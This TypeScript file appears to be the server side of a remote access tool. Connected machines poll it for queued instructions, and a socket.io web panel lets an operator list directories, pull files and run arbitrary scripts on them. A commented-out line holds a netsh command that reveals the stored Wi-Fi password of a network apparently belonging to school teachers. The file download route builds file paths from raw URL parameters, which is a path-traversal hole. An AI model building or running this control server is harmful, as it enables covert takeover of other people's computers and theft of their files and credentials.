import Computer from "./Computer";
import { Server } from "socket.io";
import { Socket } from "dgram";
import bodyParser from "body-parser";
import express from "express";
import fs from "fs";
import http from "http";
import net from "net";
import path from "path";
import { randomUUID } from "crypto";
import { resolveModuleName } from "typescript";

const socketio = require("socket.io");
const server = new net.Server();

const PORT: number = 8081;
const app = express();
const httpserver: http.Server = http.createServer(app);
const io: Server = socketio(httpserver);

const userIDS = new Map<string, Socket>();

console.log(Buffer.from(";dfbid;"));
const MessageSplitter = ";sfd;";
const Computers = new Map<string, any[]>();
const instructions = new Map<string, string[]>();

function wait(ms: number) {
  return new Promise<void>((res) => {
    setTimeout(() => res(), ms);
  });
}
async function isEmptyDir(path: string) {
  try {
    const directory = await fs.promises.opendir(path);
    const entry = await directory.read();
    await directory.close();

    return entry === null;
  } catch (error) {
    return false;
  }
}
function waitForResponse(id: string, maxTime: number) {
  return new Promise<void>((res) => {
    setTimeout(() => {
      res();
    }, maxTime);
    setInterval(() => {
      const data = Computers.get(id);
      if (data) {
        if (data.length > 0) res();
      }
    }, 50);
  });
}

const connections = server.on("connection", (socket) => {
  let currentID: string;
  let filedata: Buffer[] = [];
  let sendingFile: boolean = false;
  let filename: undefined | string = "";
  //console.log(socket.remoteAddress, socket.remotePort);
  socket.on("data", async (data) => {
    let newBuffer: Buffer = new Buffer(0);

    const lastIndexOfSplitter = data.lastIndexOf(";sfd;");
    if (String(data).startsWith("ping")) {
      const ID = String(data).split(MessageSplitter)[1];
      if (!instructions.has(ID)) {
        console.log("settingID");
        instructions.set(ID, []);
      }
      if (!ID) return socket.write("noInstruction");
      if (!instructions.has(ID)) return socket.write("noInstruction");
      const instruction = instructions.get(ID);
      if (!instruction || !instruction.length) return;
      console.log(instruction);
      socket.write(instruction[0]);
      instruction.shift();
      instructions.set(ID, instruction);
      return;
    }

    if (String(data).startsWith("setid")) {
      const ID = String(data).split(MessageSplitter)[1];
      if (!ID) return;
      if (instructions.has(ID)) return;
      console.log("settingID");
      instructions.set(ID, []);
      return;
    }

    if (String(data).startsWith("dirdata")) {
      console.log(
        String(data)
          .split(";sfd;")
          .map((item) => item.split(";osd;"))
      );
      Computers.set(
        String(data).split(";sfd;")[1],
        String(data)
          .split(";sfd;")
          .map((item) => item.split(";osd;"))
      );
      return;
    }

    if (String(data).startsWith("runscript")) {
      //socket.write(
      //  `runscript;netsh wlan show profiles name="LehrerSLZ" key=clear`
      //);
      console.log(String(data));
      const ID = String(data).split(MessageSplitter)[1];
      if (!ID) return;
      Computers.set(ID, [data.toString("utf-8")]);
      return;
    }

    /*if (String(data).startsWith("receiveFile")) {
      //currentID = String(data).split(MessageSplitter)[1];
      //const fileLocation = String(data).split(MessageSplitter)[2];
      //console.log(fileLocation);
      //if (!fs.existsSync(`../${currentID}/${fileLocation}`)) return;
      //socket.write(await fs.promises.readFile(`../${currentID}/${filename}`));
      console.log(String(data));
      console.log(fileToSend.length);
      socket.write(fileToSend);
      socket.end();
      return;
    }*/

    if (String(data).startsWith("filedata")) {
      console.trace(String(data));
      sendingFile = true;
      let res: string = "";
      let count: number = 0;
      let fileSpecifier = String(data.slice(0, lastIndexOfSplitter));
      let [commandName, ID, SpecifiedData] = fileSpecifier.split(";sfd;");
      filename = SpecifiedData;
      currentID = ID;
      console.log(commandName, ID, SpecifiedData);
      newBuffer = data.slice(lastIndexOfSplitter + 5, data.length - 1);
      const d = {
        commandName,
        ID,
        SpecifiedData,
      };
    } else if (sendingFile) {
      newBuffer = data;
    }
    filedata.push(newBuffer);
  });
  socket.on("end", async () => {
    if (!sendingFile) return;
    if (!filename) return;
    console.log(filename);
    filename = filename.split("\\\\").pop();
    console.log(filename);
    if (!filename) return;
    if (!currentID) return;
    let dir = currentID;

    if (!fs.existsSync(dir)) {
      await fs.promises.mkdir(dir, 0o744);
    }
    fs.writeFile(
      path.join(__dirname, "./" + currentID + "\\\\" + filename),
      Buffer.concat(filedata),
      (res) => {
        console.log(res?.path);
      }
    );
    Computers.set(currentID, [filename]);
    setTimeout(async () => {
      await fs.promises.unlink(
        path.join(__dirname, "./" + currentID + "\\\\" + filename)
      );
      if (!fs.existsSync(dir)) return;
      if (await isEmptyDir(path.join(__dirname, currentID))) return;
      await fs.promises.rmdir(path.join(__dirname, currentID));
    }, 30000);

    sendingFile = false;
  });
});
type GETDIR = {
  id: string;
  dir: string;
};

type GETDATA = {
  id: string;
  data: string;
};

io.on("connection", (socket) => {
  const ids: string[] = [];
  for (let key of instructions.keys()) {
    ids.push(key);
  }
  socket.emit("newIDS", ids);

  socket.on("getFile", async (data: GETDATA) => {
    instructions.set(data.id, ["getfile;" + data.data]);
    await waitForResponse(data.id, 60000);
    socket.emit("getFile", Computers.get(data.id));
    Computers.set(data.id, []);
  });

  socket.on("getDir", async (data: GETDIR) => {
    console.log(data);
    instructions.set(data.id, [`getdir;${data.dir}`]);

    await waitForResponse(data.id, 10000);
    socket.emit("getDir", Computers.get(data.id));
    Computers.set(data.id, []);
  });

  socket.on("runscript", async (data: GETDATA) => {
    //console.trace(data)
    instructions.set(data.id, [`runscript;${data.data}`]);
    await waitForResponse(data.id, 60000);
    // @ts-ignore
    console.log(Computers.get(data.id)[0]);
    socket.emit(
      "runscript",
      // @ts-ignore
      Computers.get(data.id) ? Computers.get(data.id)[0] : []
    );
    Computers.set(data.id, []);
  });
});

server.listen(8082, () => {
  console.log("Listening on Port: ", 8082);
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static("../public"));
app.get("/", (req: express.Request, res: express.Response) => {
  res.sendFile(path.join(__dirname, "../public/index.html"));
});

app.get("/file/:id/:name", async (req, res) => {
  console.log(req.params);
  res.download(path.join(__dirname, `/../${req.params.id}/${req.params.name}`));
});

process.openStdin();
process.stdin.on("data", async (data) => {
  const ID = instructions.keys().next().value;
  if (!ID) return;

  const instructionsArray = instructions.get(ID);
  if (!instructionsArray) return;

  instructionsArray.push(String(data));
  const textfile = await fs.promises
    .readFile("./random.txt")
    .catch((err) => console.error(err));
  instructions.set(ID, [String(textfile)]);
});

httpserver.listen(PORT, () => {
  console.log(`Listening on port: ${PORT}`);
});
